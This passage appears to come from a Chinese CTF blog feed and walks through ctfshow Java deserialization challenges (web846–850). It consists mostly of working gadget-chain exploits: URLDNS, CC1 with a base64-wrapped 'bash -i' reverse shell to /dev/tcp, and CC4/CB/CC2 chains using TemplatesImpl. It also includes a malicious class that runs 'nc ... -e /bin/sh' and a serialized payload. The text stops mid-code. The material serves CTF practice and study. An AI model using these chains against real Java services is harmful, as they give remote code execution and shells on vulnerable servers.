class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/cn/evo1/cc/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"><span class="comment">//        templates.getOutputProperties();</span></span><br><span class="line"><span class="comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CB</span></span><br><span class="line">        <span class="comment">// 这里用AttrCompare是因为默认的Comparator为ComparableComparator</span></span><br><span class="line">        <span class="comment">// 这个类是在CC里面的，如果Shiro没有CC依赖的话就没法用了</span></span><br><span class="line">        <span class="comment">// 而AttrCompare是jdk里的并且也继承了Serializable，所以使用这个</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line"><span class="comment">//        beanComparator.compare(templates,new Object());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// CC2</span></span><br><span class="line">        <span class="comment">// 这里可以先用transformingComparator来防止序列化的时候报错，后面再使用反射改回来</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Java </tag>
            
            <tag> CC链 </tag>
            
            <tag> CB链 </tag>
            
            <tag> Shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow Web入门 刷题记录 4</title>
      <link href="/2023/08/26/ctfshow-web4/"/>
      <url>/2023/08/26/ctfshow-web4/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-Web入门刷题记录4"><a href="#ctfshow-Web入门刷题记录4" class="headerlink" title="ctfshow-Web入门刷题记录4"></a>ctfshow-Web入门刷题记录4</h1><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/miuzzx/article/details/128221385">CTFSHOW web入门 java反序列化篇（更新中）</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/128303093">CTFSHOW web入门 java反序列化篇 web855</a></p><p><a href="https://boogipop.com/2023/03/02/CTFSHOW-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">CTFSHOW-Java反序列化</a></p></blockquote><h1 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h1><h2 id="web846"><a href="#web846" class="headerlink" title="web846"></a>web846</h2><p>直接<code>URLDNS</code>访问题目网址即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web846</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://64724688-c89b-4ddb-985d-ed76b2bc0f0f.challenge.ctf.show/&quot;</span>);</span><br><span class="line">        <span class="comment">// 修改初始的hashCode，使得序列化时不会触发</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">urlfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        urlfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        urlfield.set(url,<span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">1</span>);</span><br><span class="line">        urlfield.set(url,-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意最后的<code>payload</code>要<code>url编码一下</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">ctfshow=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa%2FORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F3QANzY0NzI0Njg4LWM4OWItNGRkYi05ODVkLWVkNzZiMmJjMGYwZi5jaGFsbGVuZ2UuY3RmLnNob3d0AAEvcQB%2BAAV0AARodHRwcHhzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXg%3D</span><br></pre></td></tr></table></figure><h2 id="web847"><a href="#web847" class="headerlink" title="web847"></a>web847</h2><p>题目说是<code>java7</code>并且使用了<code>commons-collections 3.1</code>并且<code>删除了nc和curl命令</code>，然后给了接收部分的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">data=<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(request.getParameter(<span class="string">&quot;ctfshow&quot;</span>));</span><br></pre></td></tr></table></figure><p>用<code>CC1</code>打一下，先<code>maven</code>安一下依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/junit/junit --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>写一下<code>exp</code>（Java中弹shell要注意一下，可以看下<a href="https://www.cnblogs.com/BOHB-yunying/p/15523680.html">这个</a>和<a href="https://x.hacking8.com/java-runtime.html">这个</a>）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web847</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] shellBytes = (<span class="string">&quot;bash -i &gt;&amp;/dev/tcp/your-ip/your-port 0&gt;&amp;1&quot;</span>).getBytes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">shellStr</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(shellBytes);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,&quot;</span>+shellStr+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 注解可以乱填，因为动态代理的invoke只需要在readObject种执行一个无参方法即可触发，不需要过后面的判断</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="comment">// 这里动态代理一个LazyMap可以实现readObject-&gt;invoke-&gt;get</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web848"><a href="#web848" class="headerlink" title="web848"></a>web848</h2><p>题目说<code>甚至不准用TransformedMap类反序列化</code>，但我们上一个就用的<code>LazyMap</code>版本的，所以直接拿上一题的就能用（上一题是可以用<code>TransformedMap</code>版本的CC1的）</p><h2 id="web849"><a href="#web849" class="headerlink" title="web849"></a>web849</h2><p>题目换成<code>java8</code>和<code>commons-collections 4.0</code>，因此用<code>CC4</code>，先添加下依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造<code>exp</code>（记得要用<code>nc</code>，虽然题目里面说的删了，但是外面提示了<code>CC链之二，**可以用nc反弹**</code>，一开始没看到，麻了，并且这个题目用CC2也可以打通）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web849</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/show/ctf/java/web849_shell.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        Field tfactory = tc.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line">        <span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line">        <span class="comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line">        <span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 与前面的CC链相同，防止本地执行，先放进去个ConstantTransformer</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里是为了满足priorityQueue.heapify中的(size &gt;&gt;&gt; 1)，从而能够进入for循环</span></span><br><span class="line">        priorityQueue.add(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;evo2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用反射放进去想用的chainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payloadBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(payloadBytes);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> show.ctf.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在defineTransletClasses中要满足superClass.getName().equals(ABSTRACT_TRANSLET)</span></span><br><span class="line"><span class="comment">// 所以这里要继承下AbstractTranslet</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web849_shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;nc your-ip your-port -e /bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹完之后在自己<code>vps</code>上可能看不到变化，记得输入命令试试成功没有。</p><h2 id="web850"><a href="#web850" class="headerlink" title="web850"></a>web850</h2><p>题目提示<code>我是java7，使用了commons-collections 3.1的库并对一些可能有危险的类进行了封禁</code>，实际上是过滤了<code>Transformer</code>，因此可以用CC3，首先恶意类改成用<code>bash</code>（改来改去的。。。记得用Java7！！！！！！）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctfshow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span 